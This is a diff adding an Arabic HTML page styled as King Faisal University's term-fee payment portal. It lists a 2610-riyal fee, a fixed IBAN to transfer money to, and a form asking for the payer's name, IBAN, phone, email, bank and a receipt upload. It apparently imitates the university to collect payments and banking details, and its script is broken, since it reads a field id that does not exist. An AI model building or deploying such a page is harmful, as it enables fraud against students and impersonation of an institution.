@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سداد رسوم الترم - جامعة الملك فيصل</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<div class="header">
+    <div class="logo">
+        <img src="logo.png" alt="شعار الجامعة">
+    </div>
+    <div class="title">
+        <h1>جامعة الملك فيصل</h1>
+    </div>
+</div>
+
+<div class="main-content">
+    <h2>بوابة القبول الأكاديمي</h2>
+
+    <div class="container">
+        <h2 class="f">فاتورة السداد</h2>
+
+        <div class="info">
+            <strong></strong> <span id="adminFees"> </span>
+        </div>
+        <div class="info">
+            <strong>رسوم الترم الاول</strong> <span id="tableFees">2610 ريال</span>
+        </div>
+        <div class="info">
+            <strong>الإجمالي:</strong> <span id="totalFees">2610 ريال</span>
+        </div>
+        <div class="info">
+            <p>يتم سداد الرسوم إلى الآيبان التالي:</p>
+            <strong>SA48050000682205346715001</strong>
+        </div>
+    </div>
+
+    <h2>تأكيد السداد</h2>
+    <div class="container">
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="accountName">:اسم صاحب الحساب</label>
+                <input type="text" name="accountName" id="accountName" required>
+            </div>
+            <div class="form-group">
+                <label for="iban">:رقم الإيبان</label>
+                <input type="text" name="iban" id="iban" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">:رقم الجوال</label>
+                <input type="tel" name="phone" id="phone" required>
+            </div>
+            <div class="form-group">
+                <label for="email">:البريد الإلكتروني</label>
+                <input type="email" name="email" id="email" required>
+            </div>
+            <div class="form-group">
+                <label for="bankName">:اسم البنك المودع منه</label>
+                <input type="text" name="bankName" id="bankName" required>
+            </div>
+            <div class="form-group">
+                <label for="receipt">:إرفاق إيصال السداد</label>
+                <input type="file" name="receipt" id="receipt" accept=".jpg, .jpeg, .png, .pdf" required>
+            </div>
+            <button type="submit" class="button">إرسال</button>
+        </form>
+        <p id="responseMessage" style="text-align: center;"></p>
+    </div>
+</div>
+
+<div class="footer">
+    &copy; 2024 جامعة الملك فيصل. جميع الحقوق محفوظة.
+</div>
+
+    <!-- تضمين مكتبة jsPDF -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+
+    <script>
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const formData = {
+                accountName: document.getElementById('accountName').value,
+                ibanNumber: document.getElementById('ibanNumber').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                bankName: document.getElementById('bankName').value,
+                receipt: document.getElementById('receipt').files[0]
+            };
+
+            console.log(formData); // للتأكد من أن البيانات يتم جمعها بشكل صحيح
+            
+            // عرض ملخص الفاتورة في الصفحة
+            const summary = `
+                اسم صاحب الحساب: ${formData.accountName}
+                رقم الآيبان: ${formData.ibanNumber}
+                رقم الجوال: ${formData.phone}
+                البريد الإلكتروني: ${formData.email}
+                 اسم البنك المودع منه: ${formData.bankName}
+                                  ايصال السداد: ${formData.receipt}
+
+            `;
+            
+            document.getElementById('responseMessage').innerText = "تم إرسال البيانات بنجاح!";
+            alert("تم إرسال البيانات بنجاح!"); // هنا يمكن عرض ملخص الفاتورة في نافذة منبثقة
+
+            // استخدام jsPDF لإنشاء مستند PDF
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+
+            doc.text("تفاصيل الفاتورة", 20, 20);
+            doc.text(summary, 20, 30);
+
+            // إضافة تاريخ ووقت
+            const date = new Date();
+            doc.text(`تاريخ الفاتورة: ${date.toLocaleDateString()}`, 20, 60);
+
+            // تحميل الفاتورة كملف PDF
+            doc.save('فاتورة_السداد.pdf');
+        });
+    </script>
+</body>
+</html>
